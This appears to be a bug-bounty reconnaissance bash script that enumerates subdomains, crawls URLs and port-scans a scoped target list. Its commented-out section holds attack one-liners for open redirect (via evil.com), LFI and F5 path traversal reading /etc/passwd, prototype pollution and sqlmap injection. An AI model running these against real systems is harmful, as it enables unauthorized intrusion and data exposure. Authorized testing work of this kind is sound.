#!/bin/bash

id="$1"
ppath="$(pwd)"
scope_path="$ppath/scope/$id"
timestamp="$(date +%F_%R)"
scan_path="$ppath/scans/$id-$timestamp"
if [ ! -d "$scope_path" ]; then
  echo "Path doesn't exist."
  exit 1
fi

mkdir -p "$scan_path"
cd "$scan_path"

allports="80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672"
blacklist="md,jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico"
katanalist="js,jsp,json,php,aspx,asp"
UserAgent="UserAgent: BBP-kommandos"

#### Starting the scan ####
# Set up

echo "Starting scan against roots"
cat "$scope_path/roots.txt"
cp -v "$scope_path/roots.txt" "$scan_path/roots.txt"
mkdir -p "$scan_path/crawling" "$scan_path/files"

# Subdomain discovery
domains="$scan_path/roots.txt"
cat "$domains" | subfinder -all -silent | anew "$scan_path/subfinder_sub.txt"
findomain -f "$domains" -u "$scan_path/findomain_sub.txt"
cat "$domains" | assetfinder --subs-only | anew "$scan_path/assetfinder_sub.txt"


cat $scan_path/*_sub.txt | anew "$scan_path/subdomains.txt"
cat "$scan_path/subdomains.txt" | httpx --silent | anew "$scan_path/200subdomains.txt"
mv $scan_path/*_sub.txt "$scan_path/files"
mv "$scan_path/subdomains.txt" "$scan_path/files"

# Archived URLs enumeration
cat "$scan_path/200subdomains.txt" | gau --blacklist $blacklist --threads 10 | httpx --silent | anew "$scan_path/gau.txt"

# # Crawling
cat "$scan_path/200subdomains.txt" | katana -d 10 -silent -o "$scan_path/crawlingURLs.txt" -ef $blacklist -em $katanalist

# # Ports enumeration
cat "$scan_path/200subdomains.txt" | unfurl domains --unique | naabu -silent -ports $allports -o "$scan_Path/portsDomains.txt"

# # Sorting files
# cat "$scan_path/fullDomains200.txt" | subjs | httpx --silent | anew "$scan_path/subjs.txt"

# # Searching for git exposed on subdomains
# mkdir -p "$scan_path/git_exposed"; cd "$scan_path/git_exposed"
# goop -l "$scan_path/200subdomains.txt" -f 

# cd "$scan_path"
# mkdir -p "$scan_path/outputs"

# # Open Redirect
# cat "$scan_path/all200txt" | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do; do curl -s -L $host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" | tee -a "$scan_path/outputs/openredirect.txt"; done

# # XSS
# cat "$scan_path/all200.txt" | gf xss | anew "$scan_path/xss.txt"
# python3 /home/john/Tools/Knoxnl/knoxnl.py -i "$scan_path/xss.txt" -o "$scan_path/outputs/xss_found.txt"
# mv "$scan_path/xss.txt" "$scan_path/files"

# # LFI
# cat "$scan_path/all200.txt" | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | anew "$scan_path/outputs/lfi_outputs.txt"

# # Nuclei
# cat "$scan_path/fullDomains200.txt" | nuclei -severity medium,high,critical -silent -o "$scan_path/outputs/nuclei.txt" -H $UserAgent| notify

# # Prototype
# cat "$scan_path/subdomains.txt" | sed 's/$/\/?__proto__[testparam]=exploit\//' "$scan_path/subdomains.txt" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | anew "$scan_path/outputs/prototype.txt"

# # SQLi
# cat "$scan_path/all200.txt" | gf sqli | anew "$scan_path/files/sqli.txt"
# sqlmap -m "$scan_path/files/sqli.txt" --batch --random-agent --level 1 --output-dir=$scan_path/outputs/

# ## Need API
# #shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

# # Json 
# for sub in $(cat "$scan_path/all200.txt"); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a juicy.txt  ;done


